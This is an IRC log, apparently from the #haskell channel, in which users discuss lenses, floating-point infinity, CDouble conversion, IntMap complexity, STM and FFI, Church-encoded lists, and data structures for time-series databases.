16:56:06 <Denommus> MedDev: how do I erase the whole state of cabal? I want to restart from scratch
16:56:06 <FreeFull> erisco: Any shades of grey or just pure black and white?
16:56:11 <jfischoff> what is affine traversal?
16:56:16 <arkeet> a traversal with at most one target
16:56:26 <jfischoff> ah
16:56:27 <erisco> FreeFull, well, I can bold
16:56:28 <shachaf> Yes.
16:56:36 <FreeFull> shachaf: What's the difference between a prism and an affine traversal?
16:56:38 <shachaf> A lens is a traversal with exactly one target.
16:56:46 <FreeFull> erisco: Bold will help
16:56:51 <erisco> has someone here read a paper on Haskell? :P
16:56:51 <shachaf> Every prism is an affine traversal.
16:56:55 <sm> Denommus: rm -rf ~/{.ghc,.cabal}
16:57:03 <edwardk> FreeFull: _1 has at most one target, but given just that part of the tuple you can't build a whole new tuple
16:57:05 <arkeet> FreeFull: you can construct using a prism.
16:57:06 <edwardk> > _Left # 1
16:57:08 <lambdabot>   Left 1
16:57:13 <edwardk> that builds an Either
16:57:22 <edwardk> _2 # 1     -- would do what?
16:57:24 <shachaf> «The haddocks say that a Prism is a "0-or-1 target Traversal" that can be "turned around". The notion of "turning around" a Prism is what we get by removing the "more-than-1 target" nature of the Traversal.» :-(
16:57:24 <FreeFull> :t _Left
16:57:30 <shachaf> Is tel in here?
16:57:34 <arkeet> :t Control.Lens._Left
16:57:35 <lambdabot> (Applicative f, Choice p) => p a (f b) -> p (Either a c) (f (Either b c))
16:57:37 <arkeet> shachaf: no
16:57:39 <edwardk> shachaf: fix them
16:58:04 <MedDev> Denommus, well now that's kinda... umm difficult :/
16:58:10 <FreeFull> > _2 # 1 :: (a,Int)
16:58:11 <lambdabot>   Couldn't match type `s1 -> Data.Functor.Identity.Identity t0'
16:58:11 <lambdabot>              ...
16:58:18 <shachaf> You can fix fpcomplete.com pages?
16:58:44 <MedDev> Denommus, remove the package via your package manager and remove ~/.cabal ... maybe
16:58:59 <arkeet> don't remove all of .cabal
16:59:03 <FreeFull> edwardk: I would expect something like   (bottom, 1)  or similar
16:59:09 <arkeet> you probably want to keep stuff like config and bin and world
16:59:14 <FreeFull> Maybe ((),1)
16:59:15 <sm> MedDev: it's not difficult at all, I just showed the easiest way (for a person just starting out, like Denommus)
16:59:42 <Denommus> MedDev: sm's solution worked, thanks
16:59:57 <FreeFull> shachaf: Contact the article's author
17:00:10 <arkeet> tel was on here yesterday
17:00:28 <sm> Denommus: cabal install PACKAGE --dry-run is good to try first
17:00:31 <fylwind> what's the right way to convert CDouble into Double?
17:01:11 <MedDev> sm, ah ok, last time i had to do that was a while ago :)
17:01:16 <Denommus> sm: hm, thanks
17:01:26 <sm> Denommus: and keep in mind that cabal can't install c packages that you may need (it will just complain when it can't find them)
17:01:34 <MedDev> Denommus, also look at http://coldwa.st/e/blog/2013-08-20-Cabal-sandbox.html
17:01:37 <Denommus> right
17:02:02 <arkeet> fylwind: realToFrac
17:02:34 <FreeFull> realToFrac (3 :: CDouble) :: Double    seems to typecheck
17:02:56 * hackagebot th-desugar 1.0.0 - Functions to desugar Template Haskell  http://hackage.haskell.org/package/th-desugar-1.0.0 (RichardEisenberg)
17:03:05 <jfischoff> I think there are are rewrite rules to make it efficent?
17:03:24 * jfischoff .o O ( http://hackage.haskell.org/package/th-desugar-1.0.0 )
17:03:44 <jfischoff> oh that is cool
17:05:25 <fylwind> i read there were some bugs related to realToFrac: 	http://ghc.haskell.org/trac/ghc/ticket/3676
17:06:40 <Rarrikins> fylwind: That seems like this:
17:06:41 <Rarrikins> > floor (1.0/0.0)
17:06:42 <lambdabot>   179769313486231590772930519078902473361797697894230657273430081157732675805...
17:07:10 <fylwind> i was expecting NaN :(
17:07:19 <ion> There is no NaN :: Integer
17:07:34 <Fuuzetsu> Haskell can count up to infinity!
17:07:39 <monochrom> > 1.0 / 0.0
17:07:40 <lambdabot>   Infinity
17:07:42 <shachaf> No it can't.
17:07:55 <Fuuzetsu> Here comes shachaf to ruin the fun ;(
17:07:57 <monochrom> > sqrt (-1)
17:07:58 <lambdabot>   NaN
17:07:58 <geekosaur> Haskell: To Infinity And Beyond!
17:07:58 <shachaf> It can count up to an arbitrarily high finite number.
17:08:02 <monochrom> that's your NaN
17:08:07 <monochrom> > floor (sqrt (-1))
17:08:08 <lambdabot>   -26965397022934738615939577861835371004269654684134598591014512173659901370...
17:08:17 <shachaf> Not a NaN
17:08:17 <monochrom> that's your free gift :)
17:08:19 <ion> floor (1.0/0.0) :: Integer being fix (1+) would be rather appropriate.
17:08:20 <Rarrikins> Haha
17:09:30 <startling> > 1 / 0 :: [()]
17:09:31 <lambdabot>   No instance for (GHC.Num.Num [()]) arising from the literal `1'
17:09:31 <lambdabot>  Possible f...
17:09:47 <startling> :'(
17:09:51 <ion> What’s 0.5 :: [()]?
17:09:57 <startling> [(]
17:10:03 <ion> touche
17:10:59 <monochrom> hahaha
17:11:17 <shachaf> [(
17:11:29 <geekosaur> that'd be 0.66666...
17:11:30 <shachaf> Maybe not.
17:11:37 <fl00r> < 1/0
17:11:37 <geekosaur> [:
17:11:44 <ion> ObXkcd: http://xkcd.com/859/
17:11:46 <fl00r> > 1/0
17:11:47 <lambdabot>   Infinity
17:11:48 <fl00r> oops
17:12:33 <fl00r> that kind of bothers me...infinity*0 isn't 1
17:12:52 <monochrom> no one says it is 1
17:13:18 <fl00r> isn't that what 1/0 = Infinity means?
17:13:23 <monochrom> no
17:13:30 <tabemann> "infinity" is probably not the right term to use here
17:13:40 <fylwind> it's a strictly floating point thing
17:13:43 <carter> yeah
17:13:45 <carter> floats are weird
17:13:49 <carter> i work with them all day
17:13:52 <startling> lazily a floating point thing
17:13:53 <shachaf> Not all points are strictly floating.
17:14:02 <fylwind> har
17:14:05 <ion> fl00r: 1? Pfft. It obviously should be 42.
17:14:05 <fylwind> -1/0 = -Infinity
17:14:06 <ion> > 42/0
17:14:07 <lambdabot>   Infinity
17:14:09 <fylwind> 0/0 = NaN
17:14:11 <carter> they're a funny combinatorial object that happens to act like real numbers with rounding, ish
17:14:12 <fylwind> etc
17:14:12 <monochrom> not just floating point. it is also the two-point compactification of the reals, i.e., the extended reals.
17:14:38 <fylwind> do extended reals have -Infinity and NaN?
17:14:54 <carter> which extended reals?
17:14:59 <monochrom> no NaN, but they have +infinity and -infinity
17:15:06 <carter> NaN is a IEEE thing, not a math thing
17:15:29 <fylwind> of course it is, I was kidding
17:15:32 <tabemann> so what is 0/0 with extended reals?
17:15:38 <MedDev> you'll get a type error instead of NaN
17:15:44 <monochrom> http://en.wikipedia.org/wiki/Extended_real_number_line
17:15:51 <monochrom> I did not make this up
17:16:13 <carter> yeah
17:16:20 <shachaf> Why does 0/0 need to be defined?
17:16:25 <carter> you can give algebraic meaning to +/- infiity via limits
17:16:48 <fl00r> ah...so 1/0 is Infinity because the limit is bigger than any real?
17:16:53 <Taslem> Or by algebraic extension of the field like the Riemann sphere.
17:17:00 <monochrom> 0/0 does not need to be defined, and every IEEE 754 chip offers you the choice of raising an exception
17:17:07 <fylwind> fl00r: no, it's just a quirk of the IEEE floating point system
17:17:13 <Taslem> Where you don't really need limits and get 1/0 = infinity for free by letting -infinity = infinity
17:17:14 <tabemann> shachaf: so basically you have / be a partial function for extended reals
17:17:35 <fylwind> honestly, 1/0 should've been set to NaN in floats
17:17:41 <fl00r> oh...so it's just defined that way so systems are predictable?
17:17:50 <shachaf> It's a total function with a smaller domain. :-)
17:17:53 <monochrom> why do anal programmers need to blame everything on IEEE 754?
17:18:14 <fylwind> right, because in floats if you do something like 1/0 you have to fail predictably
17:18:16 <monochrom> for 1/0 = oo and -1/0 = -oo, blame it on math itself.
17:18:28 <fl00r> ok that makes sense
17:18:36 <tabemann> monochrom: because IEEE 754 isn't real math
17:18:46 <monochrom> but 1/0 = oo is real math.
17:18:52 <jfischoff> thoughtpolice: that was a great tutorial (reflections). Thanks!
17:18:54 <fylwind> floats aren't even associative! :)
17:19:04 <fylwind> operations on floats, that is
17:19:11 <c_wraith> especially not division
17:19:13 <c_wraith> oh wait
17:20:07 <monochrom> correction. 1/0 = oo is extended real math.
17:20:32 <fylwind> you sure about that? wikipedia seems to disagree
17:21:05 <fylwind> also, lim x->0 (1/x) does not exist
17:21:16 <fl00r> yeah...it seems like you have to say that infinity times 0 = 1 for that to work (in real math...not floating point)
17:21:20 <monochrom> ok, I am sorry.
17:21:40 <lispy> monochrom: when i've seen 1/0 as inf, it's definitional. Such as, "We define ..."
17:22:10 <lispy> I suppose you can argue that equals and iff are the same.
17:22:20 <lispy> (definitions using the later)
17:22:22 <lispy> latter
17:22:27 <monochrom> 1/0 = oo holds for another version, the single-point compactification of the reals, i.e., the projective real ine.
17:22:43 <fylwind> yeah in that version there's only oo
17:22:56 <monochrom> http://en.wikipedia.org/wiki/Real_projective_line
17:23:12 <ion> fl00r: For all n such that n is nonzero, n/0 = ∞, therefore ∞·0 = for all n such that n is nonzero, n. ;-)
17:24:33 <fl00r> ok
17:24:34 <Sonarpulse> I am working with a protocol defined here: http://aoswiki.rakiru.com/index.php/Ace_of_Spades_Protocol#Change_Weapon
17:24:42 <fl00r> i've just never seen it defined like that
17:25:06 <Sonarpulse> I made a big sum type for the protocol
17:25:20 <Sonarpulse> and was going to define a Serialize instance for it
17:25:27 <monochrom> when you go projective, you drop the "law" "a/b=c implies a=b*c". you weaken it to "a/b=c and b!=0 implies a=b*c". therefore, there is no problem.
17:25:48 <Sonarpulse> but writing the Serialize instance would be almost as big as the initial type, and I wouldn't use the initial type again.
17:26:31 <Sonarpulse> Therefore I figured just writing a big Get monad thing
17:26:47 <Sonarpulse> which both read the field and "handled" it would actually be faster
17:26:58 <fylwind> possibly nsfw: http://hackage.haskell.org/packages/archive/altfloat/0.2.1/doc/html/src/Data-Floating-Types.html
17:27:00 <thoughtpolice> jfischoff: thanks
17:27:06 <jfischoff> :)
17:27:15 <tabemann> haha
17:27:32 <Rarrikins> fylwind: Haha
17:27:44 <fl00r> hah
17:28:53 <tabemann> both profanity and unsafeCoerce in the same module!
17:29:06 <Sonarpulse> so, #haskell, does that idea sound good? shoudl I use binary or cerial?
17:29:07 <monochrom> Foreign.C.Types does export CDouble's constructor.
17:29:56 <monochrom> I think, instead, he/she fails to know the difference between Foreign.C.Types(CDouble) and Foreign.C.Types(CDouble(CDouble))
17:30:15 <jfischoff> Sonarpulse: ekmett's got a package for that
17:30:47 <Sonarpulse> any idea what it is called?
17:31:02 <thoughtpolice> CDouble wasn't always exported
17:31:08 <thoughtpolice> er, the constructor, I mean
17:32:03 <monochrom> ok, but is this true: when it was not exported, it coincided with the good old days of Haskell 98 FFI which didn't require newtype constructors to be visible
17:32:03 <geekosaur> wasn't it specifically exported so that operation (CDouble <-> Double) could be optimized?
17:32:38 <fylwind> as I said earlier, there doesn't seem to be a way to convert CDouble -> Double without either losing safety (unsafeCoerce) or losing information (realToFrac)
17:32:47 <monochrom> and therefore, it was not exported when it was not needed
17:32:54 <thoughtpolice> it seems it was actually only exported in base 4.5, or 7.4.x
17:33:01 <k0001> Sonarpulse: probably “bytes” http://hackage.haskell.org/package/bytes-0.11
17:33:07 <thoughtpolice> along with the whole family in Foreign.C.Types
17:35:03 <monochrom> it is exported in 7.6.3. I just checked. (:m+Foreign.C.Types, :type CDouble
17:35:05 <monochrom> )
17:36:07 <monochrom> 7.4 is also approximately when GHC enforced the Haskell 2010 FFI requirement, newtype constructors need to be visible
17:37:17 <Sonarpulse> thanks k0001
17:42:57 <FreeFull> Is it me or is http://www.haskell.org/haskellwiki/Netwire out of date?
17:44:47 <FreeFull> Yeah, it's for version 3 rather than 4
17:54:52 <FreeFull> pDouble :: Proxy * Double   What does the * mean in the type signature here?
17:55:55 <tabemann> interesting; in MLs that means a tuple, but obviously not in Haskell
17:58:06 <TallerGhostWalt> I've been thinking about working on a time series database in haskell and was wondering if anyone had seen something like that already made?
17:58:08 <monochrom> that * may be a kind
17:58:15 <tabemann> yeah'
17:58:46 <monochrom> the type may be "Proxy (put a kind here) (put a type here)"
17:58:49 <tabemann> but you can put kinds in types themselves?
17:59:05 <monochrom> I don't know. perhaps PolyKinds allows it
18:00:10 <shachaf> It's a parameter.
18:00:10 <monochrom> another possibility: infix type variable. think of "f Proxy Double" but write it infix
18:00:44 <shachaf> pDouble :: Proxy * Double; pTrue :: Proxy Bool True
18:01:29 <monochrom> oh, so it is a kind
18:05:43 <FreeFull> It's used together with   outAs :: Proxy * b -> w a b -> w a b
18:06:50 <carter> hey morvism :)
18:07:43 <carter> i've a friend who knows way too much category theory and abstract algebra, whats a good haskell intro for him?
18:08:03 <carter> ('cause i'm not sure what pedagogy is good from that angle)
18:09:41 <fylwind> is there a strict form of "sum" so I don't have to define sum' = foldl' (+) 0 every time? :p
18:10:03 <TallerGhostWalt> Is the time for accessing a member in an array in haskell still O(c) ?
18:10:11 <carter> yup
18:10:18 <carter> its jsut as good at arrays as everyone else
18:10:21 <tabemann> fylwind: I've always myself wondered why they didn't implement such standard functions with foldl'
18:10:30 <Cale> fylwind: There isn't, but typically if you compile with optimisations, sum will take advantage of strictness.
18:10:30 <TallerGhostWalt> Smooth
18:10:54 <Cale> (strictness analysis seems to be smart enough to handle that case usually)
18:11:10 <tabemann> the problem is that you shouldn't rely on optimization to ensure the correctness of one's code (because overflowing the stack can't be called "correct")
18:13:59 <tabemann> can one call the time complexity of a lookup in a bitwise patricia trie (e.g. an IntMap) O(1)?
18:14:22 <shachaf> One can call lots of things O(1) if one wants to.
18:15:53 <tabemann> shachaf: the reason why I say O(1) is that the path from the root to the leaf of a bitwise patricia trie maxes out at the number of bits in an Int, and the number of bit comparisons one will have to do will be constant no matter how many or how few members are in such a trie
18:16:09 <Cale> If we're being pedantic, either every operation on an IntMap is O(1) (because we're taking the boundedness of its size into account), or we imagine that the structure can have arbitrarily many elements, and in that case lookup cannot be better than O(log n).
18:16:29 <shachaf> Yes, and a regular Map will never have more than 2^64 items in it, so operations are O(1) too!
18:16:48 <Cale> Any function whose range has n elements takes at least O(log n) time to compute
18:17:19 <fylwind> is unsafeCoerce safe when used on a newtype?
18:17:38 <Cale> This is because you have to examine at least O(log n) bits of the input in order to distinguish between n different cases
18:17:41 <monochrom> I think the doc says yes
18:17:43 <shachaf> That depends on what you mean by "safe".
18:17:58 <shachaf> The answer you're looking for might be "yes".
18:18:04 <Cale> (well, specifically, at least ceiling(log n / log 2)
18:18:07 <Cale> )
18:18:14 <tabemann> I'm speaking specifically about bitwise patricia tries here, because the key in one is always an Int, and log (sizeOf (undefined :: Int)) == 64 on a 64-bit architecture, and one is always do one comparison for each element in the key
18:18:41 <Cale> tabemann: If you start accounting for the fact that the size of the structure is bounded, then every operation is O(1).
18:18:44 <monochrom> "Documentation for correct usage in GHC will be found under unsafeCoerce# in GHC.Base (around which unsafeCoerce is just a trivial wrapper)"
18:18:54 <Cale> Including, for instance, map or filter.
18:19:20 <tabemann> Cale: I'm talking specifically about the characteristics of tries here
18:19:39 <tabemann> the number of comparisons when doing a lookup in a trie is equal to the number of elements in the key
18:19:42 <monochrom> and under unsafeCoerce#, "The following uses of unsafeCoerce# are supposed to work" "Casting between two types that have the same runtime representation." "a newtype of a type T has the same representation at runtime as T"
18:19:49 <monochrom> so, use the docs
18:20:13 <tabemann> in a bitwise trie, each comparison occurs in constant time itself, as each node can only have two children
18:20:17 <fylwind> I did see that but I just wanted to confirm what I was reading :)
18:21:24 <Cale> tabemann: The maximum number of elements in the trie is also bounded by 2^64, and so we can map a constant time function over the entire tree and rebuild the tree in somewhere around 2^64 * 64 steps which is a constant so that operation is O(1) as well.
18:21:53 <FreeFull> Of course, constant time doesn't tell you anything about how fast something actually will be
18:22:10 <Cale> tabemann: The memory in your computer is finite, and so any function whatsoever on it will be "constant time" in a similar way.
18:22:37 <monochrom> big-O analysis is fairly useless
18:22:39 <tabemann> yes; a bitwise trie lookup is (I think) O(1) and a lookup in an array is also O(1), but the array lookup will naturally have a much smaller constant factor
18:23:05 <Cale> tabemann: I'd prefer to say that both are O(log n), where n is the number of elements in the structure.
18:23:27 <Cale> But it's common enough to ignore log factors
18:23:53 <tabemann> Cale: the reason why I say O(1) and not O(log n) for bitwise tries is that you have to do an equal number of comparisons no matter if the trie contains 1 member or 2^64 members
18:24:07 <monochrom> actually, that's unfair. more fair: big-O analysis should be accompanied anally by units, e.g., "O(log n) multiplications" not "O(log n)"
18:24:37 <monochrom> be explicit what you're hiding
18:25:11 <monochrom> you're always hiding something
18:25:28 <tabemann> in the case of a bitwise trie, e.g. you have to test each bit in your value individually, which has its expense (but is no more than, say, the typical string hash function)
18:26:21 <tabemann> and traversing a trie naturally has far poorer cache locality, than, say, accessing successive members of an array
18:27:11 <tabemann> still, the existence of things like hash tries (which are based on bitwise tries), makes me wonder why we even use things like binary search trees
18:28:16 <tabemann> comparing a single bit per step is often going to be far less expensive than comparing an arbitrary data structure; you only need to do a full comparison when you reach a leaf
18:29:50 <JHak23> how do I write preemptive code with no bugs. I am thinking of using Haskell.
18:30:44 <joelteon> to write code with no bugs, you have to be perfect
18:31:02 <monochrom> by writing no preemptive code. I am not kidding. write threads. let the computer preempt your threads correctly
18:31:27 <tabemann> cool; unordered-containers contains Data.HashMap.* and Data.HashSet, which are based on hash array mapped tries... why the hell do I even use Data.Map?
18:31:30 <ParaSa1lin> @faq can haskell do preemptive code with no bugs?
18:31:30 <lambdabot> The answer is: Yes! Haskell can do that.
18:32:03 <monochrom> because you didn't know unordered-containers. now comes with Haskell Platform!
18:32:13 <MedDev> @faq can haskell do my dishes?
18:32:13 <lambdabot> The answer is: Yes! Haskell can do that.
18:32:24 <MedDev> been doin it wrong this whole time
18:32:28 <JHak23> Joelteon, that is probably ideal but thinking along that line.
18:32:40 <JHak23> monochrom, could you elaborate more ?
18:32:44 <monochrom> no
18:33:22 <tabemann> JHak23: look at STM - it makes writing concurrent code correctly much easier (but still not trivial)
18:33:33 <JHak23> monochrom, kidding aside, I am thinking of using Haskell in writing mutlicore programming code.
18:33:48 <tabemann> @faq can haskell write code for multicore?
18:33:49 <lambdabot> The answer is: Yes! Haskell can do that.
18:33:49 <monochrom> I was not kidding.
18:33:56 <JHak23> tabemann, thanks. Will look into that.
18:34:07 <MedDev> @faq will Haskell fill the void left by my lover scorned by the fact that I spend so much time on the computer?
18:34:07 <lambdabot> The answer is: Yes! Haskell can do that.
18:34:14 <JHak23> monochrom, I know you are not kidding. I was kidding by aiming to be perfect.
18:34:30 <tabemann> well one *should* aim to write correct code
18:36:24 <tabemann> actually
18:36:39 <tabemann> you should read Parallel and Concurrent Programming in Haskell by Simon Marlow
18:37:25 <tabemann> http://chimera.labs.oreilly.com/books/1230000000929
18:37:31 <JHak23> tabemann, ok. I will go read it and see whether it will meet my requirement. Another simple requirement is that it has to work with existing C code.
18:37:48 <leroux> JHak23: It can do that.
18:37:55 <tabemann> JHak23: yes it can - just remember to mark your FFI outcalls as being "safe"
18:38:33 <tabemann> (and avoid people's libraries which use "unsafe" FFI whenever possible)
18:39:43 <JHak23> tabemann and leroux, thnx. Noted.
18:40:34 <tabemann> note that "safe" does increase your latency in FFI calls, but "unsafe" stops all Haskell threads running, while "safe" shunts all the Haskell threads running in a given capability into another OS thread
18:41:23 <JHak23> Actually, STM in general might be useful. I see there are 15 languages listed on wikipedia as being able to support STM in some shape or form.
18:41:33 <JHak23> tabemann, ok.
18:41:45 <tabemann> note that some STM implementations are better than others, and Haskell's is excellent
18:42:13 <vx-k> مَـَّوُوُحخ ̷̴̐خ ̷̴̐خ ̷̴̐خ امارتيخ ̷̴̐خ
18:42:27 --- mode: ChanServ set +o monochrom
18:42:31 <tabemann> another thing - is your C code you're calling thread-identity sensitive? (i.e. does it keep thread-specific state or check what thread it is running in?)
18:42:33 --- mode: monochrom set +b *!*@gateway/web/freenode/ip.98.85.4.55
18:42:34 --- kick: vx-k was kicked by monochrom (vx-k)
18:42:50 --- mode: monochrom set -o monochrom
18:44:04 <Ghoul_> :t splitAt
18:44:04 <lambdabot> Int -> [a] -> ([a], [a])
18:46:21 <tabemann> (if it is, you should fork whatever Haskell thread you are calling the C code from with forkOS and not forkIO, as that guarantees that it will always run on the same OS thread; note you don't want to use forkOS otherwise, as forkOS has far poorer performance than forkIO due to context switches therefor having to always go through the kernel)
18:46:43 <Ghoul_> :t (:)
18:46:43 <lambdabot> a -> [a] -> [a]
18:47:46 <erisco> seems Applicative wants associativity... ie (a <*> b) <*> c  equiv to a <*> (b <*> c)  if I understand correctly
18:48:18 <JHak23> tabemann, I will note down your suggestion. I will come back with more question after reading STM and Marlow's books (one from Simon and one from Christopher). :P
18:49:14 <erisco> ah, right, this only has to be for the "free type" of the applicative
18:49:50 <erisco> my underlying computation on <*> is not associative depending on how you define equality
18:50:30 <erisco> so basically the laws state that you should be responsible and use something like ($) for applying the left of <*> to the right
18:51:01 <erisco> :t pure (.) <*> u <*> v <*> w
18:51:02 <lambdabot>     Couldn't match expected type `f0 (b1 -> b0)'
18:51:02 <lambdabot>                 with actual type `Expr'
18:51:02 <lambdabot>     In the second argument of `(<*>)', namely `u'
18:51:10 <erisco> :t \u v w -> pure (.) <*> u <*> v <*> w
18:51:11 <lambdabot> Applicative f => f (b1 -> b) -> f (a -> b1) -> f a -> f b
18:53:00 <erisco> okay, but this isn't quite like composition like for Category
18:57:32 <oio> how could add thing to a trre ?
18:57:37 <oio> tree
19:01:00 <monochrom> depends on the actual tree. show actual code.
19:01:49 <dmwit> :t (<*>)
19:02:02 <lambdabot> Applicative f => f (a -> b) -> f a -> f b
19:02:22 <dmwit> I don't think (a <*> b) <*> c = a <*> (b <*> c) is an Applicative law.
19:02:26 <dmwit> The typing ain't right.
19:02:35 <Ghoul_> the new l-paste is sexy
19:03:11 <Ghoul_> What's a better way to do this:
19:03:23 <lpaste> oio pasted “Data” at http://lpaste.net/92301
19:03:43 <Ghoul_> http://lpaste.net/92302
19:03:43 <oio> i want to create a tree with that
19:04:12 <oio> and look ut stuff in the tree
19:04:30 <FreeFull> So a tree based on indentation?
19:05:31 <oio> guess.. yes
19:06:39 <oio> trunk is toraz branch is etc
19:10:01 * tabemann wonders why people don't use `quot` and `rem` with unsigned values more rather than `div` and `mod`, considering that they are less expensive
19:10:36 <FreeFull> oio: You probably first want to convert that to a list of value and indentation level, and then write a function that turns that into a tree
19:10:55 <Ghoul_> just forgot about them
19:11:04 <Ghoul_> > 6 `quot` 4
19:11:05 <lambdabot>   1
19:13:33 <MedDev> @faq will Haskell cure me of alcoholism?
19:13:33 <lambdabot> The answer is: Yes! Haskell can do that.
19:15:10 <erisco> @faq can Haskell compile my research paper for me?
19:15:10 <lambdabot> The answer is: Yes! Haskell can do that.
19:15:14 <erisco> damn
19:15:17 <MedDev> dude
19:15:21 <MedDev> it does everything
19:15:56 <johnw> is there a name for a specific list represented by a fold-function: \c n -> c 1 (c 2 (c 3 n))?
19:15:59 <MedDev> static types == miracles == magnets == how they work
19:16:20 <johnw> @tell sclv_ what is shared preview?
19:16:21 <lambdabot> Consider it noted.
19:16:27 <johnw> @tell sclv what is shared preview?
19:16:27 <lambdabot> Consider it noted.
19:19:39 <tabemann> johnw: why does that look like a difference list of successive positive integers, except with function c rather than (:)?
19:19:57 <tabemann> s/(:)/(++)
19:20:30 <tabemann> nah, it's not that
19:20:30 <johnw> if that were a function name f, then f (:) [] would be [1,2,3]
19:21:24 <joelteon> when will hackage build my doc?
19:21:26 <joelteon> docs
19:21:34 <erisco> @pl \y -> fmap (flip f $ y) xss
19:21:38 <lambdabot> flip (fmap . (flip f $)) xss
19:21:38 <lambdabot> optimization suspended, use @pl-resume to continue.
19:21:39 <johnw> i'm trying to puzzle what this thing is, since it's seems to be a function mapping my "proto-list-like" (or whatever it's called) to any F-algebra for the Functor inferred by c and n
19:22:18 <johnw> Pierce calls it a "fold function", but I wonder if there's a more categorically-inclined name
19:23:50 <sclv> johnw: on school of haskell
19:23:59 <sclv> suppose i have a draft
19:24:10 <sclv> and i want to run it past three friends before publishing it
19:24:12 <sclv> there's no way to do that
19:24:16 <sclv> i can see the preview of my draft
19:24:18 <johnw> oh, I see what you mean
19:24:22 <johnw> yeah, WordPress lets me do that
19:24:35 <sclv> this has come up like three times in the last week is why i ask :-)
19:24:45 <johnw> i'll add an issue for this
19:24:47 <sclv> like by various folks building tutorials
19:24:51 <sclv> ok, cool. thanks!
19:26:34 <johnw> sclv: you will be at ICFP?
19:26:37 <johnw> oh yeah, you said you would be
19:26:40 <johnw> looking forward to it!!
19:26:56 <sclv> yeah -- will be great to see lots of people there
19:27:22 <johnw> do lots of Haskellers usually go out to meals together?
19:28:54 <sclv> yeah -- the art of the conference is about latching onto the right dinner group :-)
19:29:15 <sclv> i think you can call the "fold of a list" a church encoding as well
19:29:32 <sclv> see section 5.4 http://www.cs.ox.ac.uk/people/ralf.hinze/publications/IFL10.pdf
19:29:54 <johnw> sclv: awesome, thanks!
19:31:07 <johnw> and where would it stand, categorically?
19:33:30 <johnw> it's sort of like a polymorphic F-algebra
19:33:44 <johnw> except that it's not the algebra itself, but the data to which the algebra is applied
19:34:25 <johnw> that makes me think it's just an object in some hom-set related to F-algebras
19:35:04 <sclv> its iso to the list
19:35:19 <sclv> so its a sort of yoneda-ish thing where you can represent objects as actions
19:35:29 <johnw> ah, that makes sense!
19:35:35 <johnw> i hadn't thought of yoneda in this context
19:35:44 <carter> sclv you'll be at icfp?
19:35:46 <sclv> its an analogy -- not exactly that, but the notion
19:35:49 <sclv> carter: of course!
19:35:53 <sclv> or rather the first portion
19:35:58 <sclv> not really the conference proper
19:36:03 <carter> which half is that?
19:36:05 <sclv> cufp/haskell symposium
19:36:12 <carter> fair
19:36:23 <carter> i just need a brain blast of being out of nyc :)
19:36:43 <johnw> sclv: oh, so will I not see yoU?
19:36:56 <carter> johnw you're there for the ICFP proper?
19:37:01 <johnw> yes, and only
19:37:29 <sclv> oh dear, i guess we may not overlap :-(
19:37:43 <sclv> i'm tempted to stick around for the first day of icfp and just chill
19:38:12 * hackagebot BlogLiterately 0.6.2 - A tool for posting Haskelly articles to blogs  http://hackage.haskell.org/package/BlogLiterately-0.6.2 (BrentYorgey)
19:38:56 <johnw> sclv: please do :)
19:43:48 <edwardk> TallerGhostWalt: i've done some work on one, but nothing really too public. just some streaming time series calcs online
19:44:57 <TallerGhostWalt> edwardk: yeah? I can't decide what kind of underlying structure to use
19:45:25 <edwardk> TallerGhostWalt: be warned. asking me that question is getting ready to take a trip down a pretty strange rabbit hole ;)
19:45:37 <Fuuzetsu> it's too late
19:45:55 <TallerGhostWalt> no I want that
19:46:30 <TallerGhostWalt> I want something that would work well to archive and to do concurrency with
19:46:30 <edwardk> TallerGhostWalt: i've got two main tricks for data structures that i like to explore for offline/online storage. cache oblivious lookahead arrays and wavelet trees
19:47:23 <edwardk> https://github.com/analytics/analytics/blob/master/notes/papers.md covers a pretty good cross section of my references on the topic
19:47:59 <TallerGhostWalt> lookahead arrays sounds promising, thanks so much!
19:48:04 <edwardk> in particular navarro's paper in "wavelet trees for all", and the "cache oblivious streaming b-tree" papers are awesome
19:48:22 <edwardk> TallerGhostWalt: i'm literally right at this moment building a library for them, as in i started yesterday
19:48:34 <carter> @hoogle coyoneda
19:48:35 <lambdabot> No results found
19:48:38 <TallerGhostWalt> I really am surprised at how few TSDB resources are in the Open source community
19:48:39 <carter> @hoogle yoneda
19:48:39 <lambdabot> No results found
19:48:49 <edwardk> https://github.com/ekmett/structures/blob/master/src/Data/Vector/Map.hs
19:49:10 <edwardk> well, time series tend to be the kind of things that you work with for money ;)
19:50:19 <TallerGhostWalt> Yeah I definitely am
19:50:20 <edwardk> https://github.com/ekmett/time-series describes a toy edsl for streaming calculations over time series, and i've also done http://hackage.haskell.org/package/multipass both are kind of dense
19:50:33 <TallerGhostWalt> But want to make it public
19:50:50 <edwardk> i can empathize with that motivation
19:51:47 <edwardk> but that navarro paper is probably the best comprehensive overview for wavelet trees, and wavelet trees are literally the most interesting data structure i've encountered in 15 years.
19:51:47 <TallerGhostWalt> with hcloud becoming mature, I have in mind, building a poly database where time series data is stored as a time series and other kinds of data are stored as other things... Does this sound like a reasonable idea?
19:52:06 <TallerGhostWalt> Want to do the TSDB stuff first to get my feet wet on real library design
19:52:11 <edwardk> *nods*
19:52:24 <carter> it'll be a fun project where you'll keep on having better and better approaches
19:52:30 <edwardk> yeah
19:52:46 <carter> and then 20 years later: a db company or a long sequence of experiments!
19:53:25 <tabemann> stupid question - can you derive NFData?
19:53:27 <TallerGhostWalt> I mean surely Riak is just the beginning right?
19:53:40 <TallerGhostWalt> DBs gonna be more FP soon
19:54:34 <TallerGhostWalt> Gosh thanks again, I have lots of reading to do!
19:54:42 <tabemann> oh, you can, but it takes TH
19:56:33 <carter> TallerGhostWalt theres many many folks working on it :)
19:56:41 <carter> hopefully you too soon!
19:56:46 <johnw> tabemann: a lot of times just "instance NFData Foo" works for me, no TH needed
19:56:58 <johnw> unless that's not doing what I think it should be...
19:57:05 <sclv> sure ain't
19:57:12 <sclv> the default instance is just whnf i think
19:57:15 <johnw> ah
19:59:11 <tabemann> for some reason the TH solution just doesn't seem as nice to me as a proper {-# LANGUAGE DeriveNFData #-} and deriving NFData
19:59:19 <tabemann> but then I don't really like the look of TH
20:00:01 <johnw> i like to avoid TH too
20:00:07 <johnw> it has bitten me in subtle ways
20:01:34 <edwardk> johnw: i think that statement may get your Yesod preferred member status revoked
20:01:50 * johnw edits IRC logs everywhere
20:01:59 <carter> heheheheheeheh
20:02:02 <tabemann> just looking at Yesod scared me with the sheer amount of TH involved
20:02:18 <johnw> I do use TH for shakespeare, and like it for that
20:02:29 <johnw> I just always look for non-TH solutions first if I can
20:02:59 <tabemann> I both conceptually don't really like TH nor do I like the aesthetics of TH (it doesn't look like real Haskell code)
